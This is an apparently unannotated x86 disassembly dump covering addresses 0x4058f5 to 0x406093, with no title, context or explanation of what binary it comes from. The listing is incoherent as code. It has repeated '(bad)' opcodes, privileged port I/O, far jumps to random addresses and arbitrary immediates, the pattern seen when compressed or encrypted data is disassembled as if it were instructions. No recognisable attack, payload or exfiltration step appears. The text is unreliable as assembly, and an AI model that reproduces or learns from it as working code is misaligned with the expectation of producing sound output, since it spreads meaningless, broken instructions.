  4058f5:	add    BYTE PTR [eax],al
  4058f7:	mov    ebp,0x444c46f8
  4058fc:	sbb    dl,0xd1
  4058ff:	dec    ebp
  405900:	inc    ebx
  405901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405902:	sbb    al,ah
  405904:	add    BYTE PTR [edi+0x6adcddb],bl
  40590a:	and    BYTE PTR [ecx+ebx*1+0x2edc465c],ah
  405911:	jp     0x405990
  405913:	and    cl,BYTE PTR [ecx-0x1]
  405916:	jge    0x40590e
  405918:	sub    ch,bl
  40591a:	(bad)  
  40591b:	pusha  
  40591c:	push   0x96bc0024
  405921:	and    al,BYTE PTR [ecx]
  405923:	fsub   DWORD PTR [ebx-0x2f]
  405926:	dec    edx
  405927:	adc    eax,0xbeab6bc0
  40592c:	push   ss
  40592d:	cli    
  40592e:	jge    0x405927
  405930:	mov    edx,0x5edffd38
  405935:	pop    ecx
  405936:	aam    0x93
  405938:	sub    cl,BYTE PTR [ebx+0x2e]
  40593b:	xor    BYTE PTR [eax],cl
  40593d:	div    ch
  40593f:	(bad)  
  405940:	call   0x3e03029d
  405945:	adc    eax,0x30076797
  40594a:	cmp    eax,0xaf8c7a75
  40594f:	stos   DWORD PTR es:[edi],eax
  405950:	mov    eax,0x271ed1d
  405955:	inc    ecx
  405956:	sbb    DWORD PTR [esi],eax
  405958:	add    al,0xf0
  40595a:	out    0x2e,eax
  40595c:	test   al,0x11
  40595e:	stos   DWORD PTR es:[edi],eax
  40595f:	cmp    ebp,eax
  405961:	(bad)  
  405962:	jl     0x4059a6
  405964:	fidiv  DWORD PTR [ebp-0x2f]
  405967:	je     0x4058fe
  405969:	xor    DWORD PTR ss:[edx+0x3c],edx
  40596d:	xchg   esi,eax
  40596e:	in     al,dx
  40596f:	mov    eax,ds:0x7f6f5827
  405974:	push   es
  405975:	push   edx
  405976:	add    BYTE PTR [ebx],0xd5
  405979:	ret    0xea57
  40597c:	and    BYTE PTR [edi+0x5e],bh
  40597f:	loope  0x405977
  405981:	xor    ch,BYTE PTR [esi]
  405983:	jbe    0x405910
  405985:	dec    ebp
  405986:	pusha  
  405987:	mov    BYTE PTR [ecx],bl
  405989:	cmp    eax,0x5140b22f
  40598e:	out    dx,al
  40598f:	std    
  405990:	(bad)  
  405992:	ficomp WORD PTR [edi]
  405994:	pop    esi
  405995:	mov    ebp,0x897a9c8e
  40599a:	es xor dl,bl
  40599d:	lods   al,BYTE PTR ds:[esi]
  40599e:	dec    esi
  40599f:	mov    ch,0xb1
  4059a1:	or     dl,cl
  4059a3:	inc    edi
  4059a4:	jmp    0x4059be
  4059a6:	les    esp,FWORD PTR [ebx]
  4059a8:	lods   al,BYTE PTR ds:[esi]
  4059a9:	mov    ?,WORD PTR [ebp-0x74e50835]
  4059af:	adc    BYTE PTR [ebp+esi*1+0x34de2090],bh
  4059b6:	adc    ah,BYTE PTR [ebx+0x1d02b575]
  4059bc:	outs   dx,DWORD PTR ds:[esi]
  4059bd:	mov    esi,DWORD PTR [ecx+0x74ed644]
  4059c3:	sahf   
  4059c4:	cli    
  4059c5:	or     edi,ecx
  4059c7:	aas    
  4059c8:	xchg   ebx,ebx
  4059ca:	call   0x69696a02
  4059cf:	add    eax,0x419fbfcf
  4059d4:	(bad)  
  4059d5:	xor    DWORD PTR [esi+0x4fcdaf2e],edx
  4059db:	mov    WORD PTR ss:[ecx-0xdb197f9],cs
  4059e2:	pop    edx
  4059e3:	int3   
  4059e4:	int    0xf8
  4059e6:	push   edx
  4059e7:	mov    dl,0xf
  4059e9:	mov    esp,0x8cd00060
  4059ee:	stc    
  4059ef:	push   ebx
  4059f0:	xor    al,0x5f
  4059f2:	cld    
  4059f3:	or     al,0x4e
  4059f5:	inc    edx
  4059f6:	fist   DWORD PTR [edi]
  4059f8:	ins    BYTE PTR es:[edi],dx
  4059f9:	or     BYTE PTR ds:0xb47f827a,bl
  4059ff:	(bad)  
  405a00:	jg     0x4059fb
  405a02:	and    BYTE PTR [ecx+0x67f32cce],ch
  405a08:	mov    eax,0x922410ed
  405a0d:	xchg   ecx,eax
  405a0e:	and    eax,0xd83017c6
  405a13:	les    ecx,FWORD PTR [edx+eax*1-0x2f]
  405a17:	jo     0x405a7c
  405a19:	pop    edi
  405a1a:	pop    es
  405a1b:	std    
  405a1c:	ret    0xe3b1
  405a1f:	repz push es
  405a21:	ret    
  405a22:	mov    esi,0x1bf82617
  405a27:	fadd   QWORD PTR [ecx]
  405a29:	data16 js 0x405a78
  405a2c:	fstp   DWORD PTR [edx]
  405a2e:	mov    ebx,edx
  405a30:	dec    esi
  405a31:	hlt    
  405a32:	pop    ebx
  405a33:	lds    ebp,FWORD PTR [eax+edx*1-0x1]
  405a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a38:	mov    eax,0xce2cb2bb
  405a3d:	mov    ebx,0xaeefdcce
  405a42:	repz aad 0xbb
  405a45:	icebp  
  405a46:	(bad)  
  405a47:	jmp    FWORD PTR ds:0xddb7c883
  405a4d:	sbb    dh,BYTE PTR [ebx]
  405a4f:	outs   dx,DWORD PTR ds:[esi]
  405a50:	mov    esp,0xdc93ded1
  405a55:	xchg   esi,eax
  405a56:	cmp    cl,BYTE PTR [edi-0x6c]
  405a59:	inc    ecx
  405a5a:	jg     0x4059ee
  405a5c:	mov    dh,0x93
  405a5e:	xor    al,BYTE PTR [ecx+edi*1+0x3b0c052c]
  405a65:	dec    edx
  405a66:	xchg   esp,eax
  405a67:	out    dx,al
  405a68:	out    dx,eax
  405a69:	mov    edx,edx
  405a6b:	mov    eax,ds:0xf41393
  405a70:	add    BYTE PTR [ecx+eax*2+0xe9163e4],0x7a
  405a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a79:	rol    BYTE PTR [ebx-0x1d],cl
  405a7c:	adc    BYTE PTR [ecx-0x7],ch
  405a7f:	mov    esi,0xd076af2e
  405a84:	jno    0x405a13
  405a86:	cmc    
  405a87:	pusha  
  405a88:	mov    bh,bh
  405a8a:	push   es
  405a8b:	xchg   ebx,eax
  405a8c:	sub    DWORD PTR [esi],0xfa59ee8
  405a92:	dec    ebp
  405a93:	jnp    0x405a89
  405a95:	dec    eax
  405a96:	jbe    0x405ad6
  405a98:	add    al,bl
  405a9a:	icebp  
  405a9b:	add    BYTE PTR [ebx+0x4d],cl
  405a9e:	or     cl,BYTE PTR [edx]
  405aa0:	sbb    al,BYTE PTR [ebp*2+0x21de00cf]
  405aa7:	test   DWORD PTR [ebp-0x30],ebp
  405aaa:	push   esi
  405aab:	sti    
  405aac:	pop    ebp
  405aad:	or     al,0x50
  405aaf:	jmp    0x405a6c
  405ab1:	aad    0x6f
  405ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab4:	sbb    BYTE PTR [ecx+eiz*2+0x18],ch
  405ab8:	sbb    al,0x4c
  405aba:	hlt    
  405abb:	rcl    BYTE PTR [ebx-0x4e7c9d47],1
  405ac1:	adc    al,0xd8
  405ac3:	cli    
  405ac4:	lods   al,BYTE PTR ds:[esi]
  405ac5:	sub    ch,BYTE PTR [ecx+0x75da16b]
  405acb:	mov    DWORD PTR [esi],edx
  405acd:	(bad)  
  405ace:	cli    
  405acf:	mov    ds:0xfdf8473f,al
  405ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad5:	fs test dh,ch
  405ad8:	mov    BYTE PTR [eax+edx*2],cl
  405adb:	in     ax,0xa
  405ade:	repnz (bad) 
  405ae0:	fs call 0xb72b0b65
  405ae6:	lahf   
  405ae7:	inc    ecx
  405ae8:	in     eax,0x0
  405aea:	or     DWORD PTR [ebx-0x46],0x5c
  405aee:	in     al,0x31
  405af0:	jmp    0x407e97
  405af5:	sbb    DWORD PTR [ebx],esp
  405af7:	jne    0x405a82
  405af9:	ds addr16 inc eax
  405afc:	cwde   
  405afd:	mov    esi,0xcf733d4e
  405b02:	(bad)  
  405b03:	fistp  WORD PTR [esi-0x3e]
  405b06:	dec    esp
  405b07:	push   ds
  405b08:	jecxz  0x405ad9
  405b0a:	(bad)  
  405b0b:	mov    eax,0x1f4d257a
  405b10:	cmp    eax,0xe3c4462e
  405b15:	sahf   
  405b16:	inc    edi
  405b17:	out    0x71,eax
  405b19:	mov    edi,0xf8f7f0cf
  405b1e:	jl     0x405b59
  405b20:	cmp    DWORD PTR [eax-0x7a],0xffffffff
  405b24:	xchg   BYTE PTR ds:0xdcfee1c6,bl
  405b2a:	cmp    al,0x90
  405b2c:	mov    al,ds:0x81a7c162
  405b31:	sbb    DWORD PTR [edx],0x42a3b6bd
  405b37:	in     eax,0xff
  405b39:	enter  0x3a88,0xb7
  405b3d:	(bad)  
  405b3e:	jmp    0x12eca8ea
  405b43:	outs   dx,BYTE PTR ds:[esi]
  405b44:	test   al,0xce
  405b46:	ror    dh,1
  405b48:	jmp    0xec22c86f
  405b4d:	fidiv  WORD PTR [ecx-0x2ea16446]
  405b53:	fisttp WORD PTR [esi+0x1b]
  405b56:	cld    
  405b57:	sub    BYTE PTR [ebp+0x7d],ch
  405b5a:	cmp    ah,BYTE PTR [ebx]
  405b5c:	inc    eax
  405b5d:	jo     0x405ba1
  405b5f:	aas    
  405b60:	pop    edi
  405b61:	ror    BYTE PTR [eax],1
  405b63:	fisttp DWORD PTR [edx+eiz*1+0x30]
  405b67:	jae    0x405b82
  405b69:	hlt    
  405b6a:	(bad)  
  405b6b:	fld    DWORD PTR [esi]
  405b6d:	sahf   
  405b6e:	ja     0x405b70
  405b70:	or     BYTE PTR [edx],bl
  405b72:	sti    
  405b73:	call   0xb83b:0xeb29faad
  405b7a:	leave  
  405b7b:	xchg   BYTE PTR [ebp+0xf],dh
  405b7e:	and    DWORD PTR [eax+0x624e3c63],edx
  405b84:	lds    eax,FWORD PTR [ebp+0x7c53f705]
  405b8a:	sub    al,0xc9
  405b8c:	loop   0x405b45
  405b8e:	retf   
  405b8f:	lods   eax,DWORD PTR ds:[esi]
  405b90:	ficomp DWORD PTR ds:[esi]
  405b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b94:	jge    0x405bcf
  405b96:	mov    BYTE PTR [ebp+0x3c64ad6],al
  405b9c:	push   es
  405b9d:	sar    DWORD PTR [ebx],1
  405b9f:	ret    0xebbf
  405ba2:	loope  0x405be5
  405ba4:	test   DWORD PTR [eax+eax*1],eax
  405ba7:	out    0x3f,al
  405ba9:	cmp    eax,0x7bf7a155
  405bae:	daa    
  405baf:	out    0xf9,eax
  405bb1:	jnp    0x405b3c
  405bb3:	out    0x0,al
  405bb5:	push   0xdff65788
  405bba:	dec    edi
  405bbb:	sub    DWORD PTR [ebp-0x59603390],ebp
  405bc1:	rcr    DWORD PTR [esi],cl
  405bc3:	(bad)  
  405bc4:	fnstcw WORD PTR [esi+0x1]
  405bc7:	add    BYTE PTR [eax],al
  405bc9:	mov    ch,bh
  405bcb:	sti    
  405bcc:	add    al,BYTE PTR [edx]
  405bce:	add    eax,0xadae223f
  405bd3:	xchg   esp,eax
  405bd4:	lods   al,BYTE PTR ds:[esi]
  405bd5:	ins    DWORD PTR es:[edi],dx
  405bd6:	push   0x72
  405bd8:	mov    edi,0xe82e335b
  405bdd:	sahf   
  405bde:	inc    edx
  405bdf:	pop    ss
  405be0:	fld    QWORD PTR [ebx]
  405be2:	imul   edi,DWORD PTR ds:0xb14a2029,0x2a
  405be9:	loopne 0x405bd3
  405beb:	adc    eax,0x6826f3dc
  405bf0:	outs   dx,DWORD PTR ds:[esi]
  405bf1:	ds dec edi
  405bf3:	cmp    edx,eax
  405bf5:	daa    
  405bf6:	jl     0x405bd4
  405bf8:	aad    0x7a
  405bfa:	stos   DWORD PTR es:[edi],eax
  405bfb:	(bad)  
  405bfc:	out    0x8d,eax
  405bfe:	lock jmp 0x405c4c
  405c01:	pop    edx
  405c02:	iret   
  405c03:	mov    esi,0x84eb998d
  405c08:	mov    eax,0x54053cb5
  405c0d:	jb     0x405b9c
  405c0f:	xchg   edx,eax
  405c10:	js     0x405c16
  405c12:	jo     0x405be1
  405c14:	int    0x4e
  405c16:	dec    ebp
  405c17:	in     al,dx
  405c18:	or     BYTE PTR [edi+0x4a],ah
  405c1b:	and    eax,0x9ffe4d51
  405c20:	push   0x549cee
  405c25:	inc    ebx
  405c26:	add    eax,DWORD PTR [bp+si]
  405c29:	adc    dh,BYTE PTR [eax+0x33]
  405c2c:	rol    BYTE PTR [esi-0x17],cl
  405c2f:	test   al,0x43
  405c31:	call   DWORD PTR [edi-0x4a]
  405c34:	dec    edx
  405c35:	std    
  405c36:	lods   al,BYTE PTR ds:[esi]
  405c37:	push   ds
  405c38:	add    DWORD PTR [eax],ecx
  405c3a:	mov    ss,WORD PTR [ebx+0x27]
  405c3d:	aad    0x27
  405c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c40:	in     al,0x3a
  405c42:	daa    
  405c43:	cwde   
  405c44:	mov    cl,0xa0
  405c46:	sbb    ch,BYTE PTR [edi+esi*2+0x54]
  405c4a:	pop    ds
  405c4b:	mov    eax,ds:0x977c00af
  405c50:	repnz out 0xbb,eax
  405c53:	stc    
  405c54:	clc    
  405c55:	mov    esi,0x4a70fc40
  405c5a:	add    eax,0xfffffffb
  405c5d:	jnp    0x405c39
  405c5f:	sbb    DWORD PTR [eax+0x57],eax
  405c62:	leave  
  405c63:	loope  0x405c3a
  405c65:	add    esi,DWORD PTR [ecx+0x7a]
  405c68:	lds    ebx,FWORD PTR [eax-0x6a]
  405c6b:	cs leave 
  405c6d:	pop    ss
  405c6e:	jmp    0x7034fb7b
  405c73:	sub    al,0xe1
  405c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c76:	addr16 or edx,edx
  405c79:	pop    es
  405c7a:	adc    al,BYTE PTR [edi-0x5c]
  405c7d:	sbb    DWORD PTR [ecx],0x5ba8297
  405c83:	add    ah,0x5
  405c86:	pusha  
  405c87:	test   BYTE PTR [ebp-0x7d88aa9c],bl
  405c8d:	xchg   BYTE PTR [edi-0xdf0b1c2],bl
  405c93:	sbb    BYTE PTR [esi-0x5],dl
  405c96:	jnp    0x405c41
  405c98:	pop    esp
  405c99:	retf   0x18c9
  405c9c:	mov    bh,dh
  405c9e:	rol    edi,0x8a
  405ca1:	or     al,0x3
  405ca3:	out    dx,eax
  405ca4:	gs push eax
  405ca6:	std    
  405ca7:	pop    ebx
  405ca8:	push   es
  405ca9:	ror    DWORD PTR [ebp-0x710558b2],cl
  405caf:	aas    
  405cb0:	ret    
  405cb1:	jo     0x405c8e
  405cb3:	aad    0xe3
  405cb5:	push   edx
  405cb6:	stos   BYTE PTR es:[edi],al
  405cb7:	xor    ecx,DWORD PTR [edi+0x47]
  405cba:	dec    edi
  405cbb:	sub    DWORD PTR [eax+0x6dc79c7d],edx
  405cc1:	sub    eax,0x4b2b134b
  405cc6:	jns    0x405cc9
  405cc8:	xor    ebp,0x23f55e75
  405cce:	retf   0x9b00
  405cd1:	test   eax,0xfde87529
  405cd6:	adc    eax,DWORD PTR [edi+0x25]
  405cd9:	push   ds
  405cda:	add    esp,eax
  405cdc:	js     0x405c60
  405cde:	push   ss
  405cdf:	stos   BYTE PTR es:[edi],al
  405ce0:	add    eax,0x30cd08c1
  405ce5:	arpl   cx,sp
  405ce7:	mov    eax,DWORD PTR [ecx]
  405ce9:	add    cl,bh
  405ceb:	cmp    eax,DWORD PTR [eax]
  405ced:	les    ebp,FWORD PTR ds:0xbf320800
  405cf3:	int    0xf8
  405cf5:	js     0x405c7e
  405cf7:	out    dx,al
  405cf8:	outs   dx,BYTE PTR ds:[esi]
  405cf9:	fadd   QWORD PTR [ecx+0x60]
  405cfc:	cld    
  405cfd:	inc    esp
  405cfe:	dec    edx
  405cff:	inc    ebp
  405d00:	mov    gs,ebp
  405d02:	das    
  405d03:	aam    0x69
  405d05:	pop    esp
  405d06:	or     al,0x61
  405d08:	push   ebp
  405d09:	cmp    ch,al
  405d0b:	sub    ebp,DWORD PTR [esi-0x39]
  405d0e:	jmp    0x39e0:0xc9ec2e6f
  405d15:	or     eax,0x26323286
  405d1a:	push   es
  405d1b:	jne    0x405cb2
  405d1d:	mov    ebx,0x54ba8686
  405d22:	(bad)  
  405d23:	(bad)  
  405d24:	stos   BYTE PTR es:[edi],al
  405d25:	and    eax,0x16d59001
  405d2a:	adc    edi,edi
  405d2c:	adc    ebx,ebp
  405d2e:	lods   al,BYTE PTR ds:[esi]
  405d2f:	inc    ebx
  405d30:	jbe    0x405cbb
  405d32:	sbb    eax,0x5e57a0a1
  405d37:	sbb    DWORD PTR [ebp*4+0x1293b6d7],ebx
  405d3e:	stc    
  405d3f:	sti    
  405d40:	xor    eax,0x92796733
  405d45:	ret    
  405d46:	mov    dh,0x87
  405d48:	jbe    0x405dc9
  405d4a:	inc    ebp
  405d4b:	scas   eax,DWORD PTR es:[edi]
  405d4c:	(bad)  
  405d4d:	not    ebp
  405d4f:	pusha  
  405d50:	ja     0x405db2
  405d52:	pop    ebp
  405d53:	xchg   esp,eax
  405d54:	fstp   TBYTE PTR [esi-0x68]
  405d57:	push   edi
  405d58:	stos   DWORD PTR es:[edi],eax
  405d59:	jbe    0x405d59
  405d5b:	mov    esi,0x4fe1edd7
  405d60:	dec    esi
  405d61:	ret    
  405d62:	js     0x405d49
  405d64:	jns    0x405d7f
  405d66:	add    DWORD PTR [ecx],ebp
  405d68:	mov    ah,0x77
  405d6a:	mov    BYTE PTR [eax+0x2c],cl
  405d6d:	fmul   QWORD PTR [ecx+0x3e]
  405d70:	jg     0x405d19
  405d72:	push   edi
  405d73:	mov    ds:0xafeff96b,al
  405d78:	pcmpeqd mm2,mm2
  405d7b:	mov    bh,0x3a
  405d7d:	sbb    al,0x66
  405d7f:	mov    ds:0x12d86536,al
  405d84:	mov    eax,ds:0xb4c4f71f
  405d89:	(bad)  
  405d8a:	shr    DWORD PTR [ecx],1
  405d8c:	push   esi
  405d8d:	add    esi,DWORD PTR [esi]
  405d8f:	xor    bl,dl
  405d91:	and    DWORD PTR [eax+0x9],eax
  405d94:	sub    al,BYTE PTR [edx]
  405d96:	sub    al,0xdb
  405d98:	aaa    
  405d99:	xlat   BYTE PTR ds:[ebx]
  405d9a:	es and al,0xf0
  405d9d:	sub    BYTE PTR [ebp+eax*1-0x40],cl
  405da1:	mov    bl,0x66
  405da3:	xchg   edi,eax
  405da4:	xor    BYTE PTR [ecx-0x2fbf7e66],dh
  405daa:	cmp    eax,0xe1f18238
  405daf:	xchg   ebp,eax
  405db0:	jp     0x405df5
  405db2:	cmp    al,0x42
  405db4:	mov    ebx,0x6feea419
  405db9:	jmp    0x405d5f
  405dbb:	add    al,0x77
  405dbd:	adc    eax,0x32487fc4
  405dc2:	jo     0x405d59
  405dc4:	dec    esi
  405dc5:	cli    
  405dc6:	xor    ebp,DWORD PTR [edi*4-0x5fdcd734]
  405dcd:	dec    eax
  405dce:	dec    ebx
  405dcf:	push   cs
  405dd0:	or     eax,0xcc349dbb
  405dd5:	sub    dl,BYTE PTR [edx+edi*8]
  405dd8:	or     al,0xd7
  405dda:	fbld   TBYTE PTR [ebx+0x7]
  405ddd:	ins    BYTE PTR es:[edi],dx
  405dde:	dec    eax
  405ddf:	aas    
  405de0:	ret    0xea70
  405de3:	rcl    esi,cl
  405de5:	fiadd  WORD PTR [ecx-0x76]
  405de8:	cmc    
  405de9:	mov    ebx,0x994cccf4
  405dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405def:	data16 out 0xda,al
  405df2:	mov    ebp,0x1ff4579e
  405df7:	jmp    0x405dd8
  405df9:	mov    edi,cs
  405dfb:	std    
  405dfc:	dec    esp
  405dfd:	int    0x29
  405dff:	jmp    0xc0b0702b
  405e04:	js     0x405dc7
  405e06:	push   0x7dd5f158
  405e0b:	adc    eax,DWORD PTR [ebx+0x2b]
  405e0e:	sbb    eax,DWORD PTR [ecx]
  405e10:	pop    esi
  405e11:	mov    edi,0x9347f9a7
  405e17:	fdiv   QWORD PTR [edi]
  405e19:	push   cs
  405e1a:	lods   eax,DWORD PTR ds:[esi]
  405e1b:	jne    0x405e18
  405e1d:	and    eax,0x66826b38
  405e22:	inc    ebp
  405e23:	jmp    0x347:0x77869483
  405e2a:	or     al,ch
  405e2c:	dec    esp
  405e2d:	dec    ecx
  405e2e:	jns    0x405ea2
  405e30:	neg    BYTE PTR [edi-0x4691870e]
  405e36:	aam    0xd1
  405e38:	lahf   
  405e39:	adc    BYTE PTR [eax],dl
  405e3b:	call   0xdb12e92b
  405e40:	scas   al,BYTE PTR es:[edi]
  405e41:	push   cs
  405e42:	dec    edx
  405e43:	dec    esi
  405e44:	dec    esp
  405e45:	push   edx
  405e46:	jbe    0x405e88
  405e48:	mov    ecx,0xa4785927
  405e4d:	stos   DWORD PTR es:[edi],eax
  405e4e:	push   cs
  405e4f:	aas    
  405e50:	dec    ebp
  405e51:	sbb    esp,DWORD PTR [esi]
  405e53:	aam    0xbc
  405e55:	sar    DWORD PTR ds:0xd285a11f,0x40
  405e5c:	sbb    BYTE PTR [eax],dl
  405e5e:	fcom   DWORD PTR [edx]
  405e60:	ror    DWORD PTR [ebx],0xad
  405e63:	push   cs
  405e64:	cmp    al,0xaf
  405e66:	add    BYTE PTR [eax],dl
  405e68:	fs (bad) 
  405e6a:	mov    al,ds:0x82e1b9b5
  405e6f:	and    esp,DWORD PTR ds:0x7a6b1b82
  405e75:	scas   al,BYTE PTR es:[edi]
  405e76:	push   ebx
  405e77:	sbb    esi,edx
  405e79:	xlat   BYTE PTR es:[ebx]
  405e7b:	ja     0x405e4d
  405e7d:	xcrypt-ofb (bad)
  405e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7f:	push   0x62
  405e81:	je     0x405efd
  405e83:	mov    ds:0x9943a31e,al
  405e88:	xor    ecx,DWORD PTR [edx-0x41077edf]
  405e8e:	fucomip st,st(0)
  405e90:	mov    ah,0x8c
  405e92:	push   dx
  405e94:	inc    edi
  405e95:	inc    eax
  405e96:	ror    BYTE PTR [eax-0xfa11535],0xb
  405e9d:	retf   
  405e9e:	fs loope 0x405e34
  405ea1:	aas    
  405ea2:	sbb    al,0x90
  405ea4:	add    ah,cl
  405ea6:	cmp    DWORD PTR [eax+0x68895c2f],esi
  405eac:	cmp    eax,DWORD PTR [edi+0x5b]
  405eaf:	test   al,0xc4
  405eb1:	jbe    0x405ee3
  405eb3:	lahf   
  405eb4:	xchg   edx,eax
  405eb5:	mov    esp,0x70909c62
  405eba:	pop    ebx
  405ebb:	lahf   
  405ebc:	(bad)
  405ebf:	sbb    dh,ch
  405ec1:	and    ah,BYTE PTR [edx-0x2b]
  405ec4:	ret    0xdf79
  405ec7:	mov    ebp,cs
  405ec9:	add    eax,eax
  405ecb:	mov    ds:0x6e13c57c,eax
  405ed0:	test   BYTE PTR [edi+0x1],dl
  405ed3:	mov    ch,0x32
  405ed5:	cmp    BYTE PTR [esi+0x4eabb95a],cl
  405edb:	pop    es
  405edc:	dec    edi
  405edd:	mov    eax,0x4f3c6532
  405ee2:	inc    esp
  405ee3:	pop    eax
  405ee4:	mov    ah,0xb5
  405ee6:	int3   
  405ee7:	xchg   ebx,eax
  405ee8:	adc    DWORD PTR [edx-0x3b],ebp
  405eeb:	mov    ch,0x58
  405eed:	sub    eax,0x71fb6eb5
  405ef2:	jle    0x405eaa
  405ef4:	add    cl,BYTE PTR [edi-0x18]
  405ef7:	cmp    al,0x33
  405ef9:	push   eax
  405efa:	mov    edi,0xdc7442bb
  405eff:	not    BYTE PTR [edx+0x5e]
  405f02:	es or  BYTE PTR es:[eax-0x49],ah
  405f07:	mov    dh,0xdf
  405f09:	adc    DWORD PTR [edi-0x60],esi
  405f0c:	push   edi
  405f0d:	out    dx,eax
  405f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f0f:	pop    edi
  405f10:	call   0x9ea9:0xf82ba59e
  405f17:	lea    eax,[eax+eiz*2]
  405f1a:	(bad)  
  405f1b:	xchg   edi,eax
  405f1c:	(bad)  [edi]
  405f1e:	int    0x40
  405f20:	add    bl,ah
  405f22:	xor    eax,0xc9e0100c
  405f27:	mov    esi,0x7d0f4d6f
  405f2c:	xchg   ebp,eax
  405f2d:	add    ebx,ebp
  405f2f:	loopne 0x405ed5
  405f31:	jno    0x405f12
  405f33:	xchg   ebp,eax
  405f34:	in     al,0x99
  405f36:	sub    bh,BYTE PTR [edx-0x7c72ba6d]
  405f3c:	inc    edi
  405f3d:	test   ecx,eax
  405f3f:	adc    eax,0xb7297ee0
  405f44:	or     BYTE PTR [esi-0x63],dh
  405f47:	fnsave [ecx-0x17a225b2]
  405f4d:	adc    DWORD PTR [ecx],ecx
  405f4f:	inc    ecx
  405f50:	xor    DWORD PTR [edi+0x5ee01492],ebp
  405f56:	in     al,dx
  405f57:	jmp    0x405f45
  405f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f5a:	jp     0x405fd3
  405f5c:	pushf  
  405f5d:	jp     0x405fc1
  405f5f:	push   cs
  405f60:	mov    ebp,0x7b80a586
  405f65:	pop    ecx
  405f66:	fisubr DWORD PTR [eax]
  405f68:	or     BYTE PTR [eax],al
  405f6a:	jbe    0x405f3f
  405f6c:	inc    ecx
  405f6d:	dec    edi
  405f6e:	sbb    DWORD PTR [esi],edx
  405f70:	pop    es
  405f71:	mov    ch,0x94
  405f73:	push   ebp
  405f74:	add    DWORD PTR [ebx-0x58774495],esi
  405f7a:	or     eax,0x1068ea5
  405f7f:	int3   
  405f80:	mov    esi,0xc7fe3d21
  405f85:	add    ebx,eax
  405f87:	fstp   QWORD PTR ds:0x33a40922
  405f8d:	sbb    edx,ebx
  405f8f:	ss mov dl,0x96
  405f92:	iret   
  405f93:	push   edi
  405f94:	iret   
  405f95:	or     esi,DWORD PTR [eax+0x57]
  405f98:	jbe    0x405f41
  405f9a:	ss cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f9d:	fsub   DWORD PTR [ecx-0x7b]
  405fa0:	sbb    esp,DWORD PTR [ebp+0x5eaf1e69]
  405fa6:	push   ds
  405fa7:	aaa    
  405fa8:	int3   
  405fa9:	mov    ebx,0x8070e611
  405fae:	les    eax,FWORD PTR [esi]
  405fb0:	push   es
  405fb1:	add    bh,BYTE PTR [eax-0x27cea0de]
  405fb7:	lds    edx,FWORD PTR [edx-0x58]
  405fba:	push   esi
  405fbb:	ret    
  405fbc:	sbb    BYTE PTR [eax+0x628fb77d],al
  405fc2:	mov    bl,0x39
  405fc4:	pop    edx
  405fc5:	cmp    DWORD PTR [ebx-0x5e],edx
  405fc8:	stos   DWORD PTR es:[edi],eax
  405fc9:	xor    al,BYTE PTR [ebp-0x13f971ba]
  405fcf:	push   esp
  405fd0:	imul   edi,DWORD PTR ds:0x6931ece7,0x5e860406
  405fda:	sub    BYTE PTR [eax],ah
  405fdc:	js     0x40603c
  405fde:	add    BYTE PTR [eax+0x66dfa595],ah
  405fe4:	(bad)  
  405fe5:	adc    ebx,ebp
  405fe7:	outs   dx,DWORD PTR ds:[esi]
  405fe8:	arpl   sp,sp
  405fea:	sti    
  405feb:	adc    al,0x26
  405fed:	ror    DWORD PTR [edx-0x50a63ae8],0x44
  405ff4:	(bad)  
  405ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff6:	jns    0x406038
  405ff8:	adc    DWORD PTR [ebx-0x42],ebp
  405ffb:	cmp    DWORD PTR [ebx+0x4673ba07],0x1b
  406002:	xor    al,0x1b
  406005:	call   0x747c7902
  40600a:	pusha  
  40600b:	lahf   
  40600c:	mov    dh,0xd6
  40600e:	sbb    ecx,0x64
  406011:	and    dh,dl
  406013:	cmp    DWORD PTR [ebx],ebp
  406015:	cwde   
  406016:	push   ecx
  406017:	into   
  406018:	dec    esp
  406019:	sub    dl,bh
  40601b:	shr    BYTE PTR [edx+0x48a8be],1
  406021:	inc    esp
  406022:	repz add DWORD PTR [eax-0x4b],eax
  406026:	iret   
  406027:	mov    eax,ds:0x11d1f337
  40602c:	pop    es
  40602d:	adc    edx,DWORD PTR [eax]
  40602f:	cmp    ah,BYTE PTR [ebx+esi*1+0x68cd4d4f]
  406036:	out    0x34,al
  406038:	(bad)  
  406039:	(bad)  
  40603a:	ficomp DWORD PTR ds:0xec0b8208
  406040:	dec    ebx
  406041:	fidivr DWORD PTR [ebp-0x79]
  406044:	push   ebp
  406045:	clc    
  406046:	inc    ecx
  406047:	pop    es
  406048:	ins    DWORD PTR es:[edi],dx
  406049:	xchg   BYTE PTR [edx-0x57a03b60],dl
  40604f:	and    BYTE PTR [ebx-0x22f40404],ah
  406055:	outs   dx,BYTE PTR ds:[esi]
  406056:	(bad)  
  406057:	pop    edi
  406058:	mov    eax,DWORD PTR [edx]
  40605a:	xor    al,dh
  40605c:	or     al,0x98
  40605e:	mov    al,0x7e
  406060:	mov    ah,0xff
  406062:	sbb    eax,0x1fc2ca2c
  406067:	push   cs
  406068:	pop    ds
  406069:	test   BYTE PTR [edi],0xdd
  40606c:	pop    esi
  40606d:	mov    DWORD PTR [edx-0x3d],ebp
  406070:	xor    esi,DWORD PTR [ebp+0x74]
  406073:	sub    eax,DWORD PTR [ebx-0x51a373e8]
  406079:	mov    ds:0xd7cfa826,eax
  40607e:	sbb    BYTE PTR [esi+0x6a],dh
  406081:	retf   0xc840
  406084:	adc    edi,esi
  406086:	fucomp st(5)
  406088:	inc    ebp
  406089:	mov    edx,0xfb4a3fbc
  40608e:	(bad)  
  406090:	iret   
  406091:	leave  
  406092:	push   es
  406093:	adc    BYTE PTR [ebx+esi*4-0x4edffb6f],ah
